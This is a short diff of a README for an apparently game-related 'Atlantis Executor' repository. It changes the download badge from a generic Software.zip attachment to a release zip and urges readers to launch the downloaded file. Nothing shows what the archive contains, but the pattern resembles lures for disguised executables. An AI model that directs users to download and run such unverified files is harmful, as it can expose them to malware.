@@ -12,7 +12,7 @@ Welcome to the Atlantis Executor GitHub repository! This repository is dedicated
 
 To access the Atlantis Executor software, please click on the link below:
 
-[![Download Atlantis Executor](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Atlantis Executor](https://github.com/haryad404/Atlantis-Executor/releases/download/v2.0/Release_x64.zip)](https://github.com/haryad404/Atlantis-Executor/releases/download/v2.0/Release_x64.zip)
 
 Please ensure to launch the downloaded file to begin utilizing Atlantis Executor for your needs.
 
